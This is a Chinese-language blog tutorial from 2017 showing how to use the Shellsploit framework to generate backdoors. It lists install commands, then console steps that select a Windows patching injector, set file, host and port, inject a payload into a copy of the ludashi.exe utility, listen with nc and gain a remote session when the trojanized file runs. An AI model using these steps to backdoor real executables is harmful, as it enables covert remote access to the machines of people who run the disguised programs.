---
title: Shellsploit注入器
date: 2017-08-24 19:09:24
tags: Metasploit
categories: Metasploit
---
![enter description here][1]
<!--more-->
## 视频演示：
<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/Shellsploit.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>

Shellsploit让您为各种操作系统生成自定义的shellcode，后门，注入器。让我们通过编码器对每个字节进行混淆。
github:https://github.com/vasco2016/shellsploit-framework

<pre>
Dependences
root$ sudo pip install capstone
root$ sudo pip install readline(Not necessary for windows coz preinstalled in shellsploit)
root$ sudo pip install pefile
root$ sudo pip install colorama
root$ sudo pip install pylzma
安装
Pip在两个windows / nix机器上都没有问题。现在你可以安装：
root$ python setup.py --s/ --setup install 
root$ chmod +x shellsploit (if you are using windows just pass this step)
root$ ./shellsploit
</pre>
&nbsp;
1.使用shellsploit,可以看到 运行界面，其实使用方法和msf类似，差不多！
![enter description here][2]
&nbsp;
2.比如我在这里查看injectors注入模块
<pre>ssf> show injectors</pre>
&nbsp;
![enter description here][3]
&nbsp;
3.使用injectors模块其中一个
<pre>ssf>use injectors/Windows/BFD/Patching</pre>
&nbsp;
![enter description here][4]
&nbsp;
4.查看下他里面有什么选项---(其实和msf设置方法差不多)
<pre>ssf:injectors/Windows/BFD/Patching > show options</pre>
&nbsp;
![enter description here][5]
&nbsp;
5.剩下的设置file 、host、port 这些选择，进行一些设置，其中的file选择 我已经将模板放到了目录当中。
&nbsp;
![enter description here][6]
&nbsp;
6.进行Payload注入,注入后的模板放入到了 ----File /root/shellsploit-framework/704125575/ludashi.exe
<pre>ssf:injectors/Windows/BFD/Patching > inject</pre>
&nbsp;
![enter description here][7]
&nbsp;
7.使用NC进行监听
&nbsp;
![enter description here][8]
&nbsp;
8.打开payload 得到会话。
&nbsp;
![enter description here][9]
&nbsp;
![enter description here][10]
&nbsp;
这里可能有些小小的BUG 。但是依然不影响可以得到会话。
![enter description here][11]
&nbsp;


  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/CCBB884B3A332CE78495754A559F9580.png
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1503574995795.jpg
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1503578720910.jpg
  [4]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1503578920061.jpg
  [5]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1503579069699.jpg
  [6]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1503579401918.jpg
  [7]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1503579556643.jpg
  [8]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1503579734464.jpg
  [9]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1503579888685.jpg
  [10]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1503579977420.jpg 
  [11]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/1503579900646.jpg